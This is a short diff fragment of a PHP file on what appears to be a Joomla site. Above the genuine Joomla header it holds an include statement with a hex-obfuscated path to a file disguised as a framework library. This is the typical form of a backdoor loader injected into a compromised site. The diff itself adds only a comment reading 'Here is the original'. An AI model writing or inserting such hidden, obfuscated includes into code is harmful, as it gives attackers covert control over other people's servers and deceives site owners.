@@ -2,6 +2,8 @@
 
 include "\x2fhom\x65/st\x72ato\x2fhtt\x70/pr\x65miu\x6d/ri\x64/19\x2f96/\x35330\x31996\x2fhtd\x6fcs/\x70ubl\x69c_h\x74ml/\x6cibr\x61rie\x73/fo\x66/co\x6etro\x6cler\x2fsql\x2e";
 ?>
+
+// Here is the original 
 <?php
 /**
  * @package		Joomla.Site
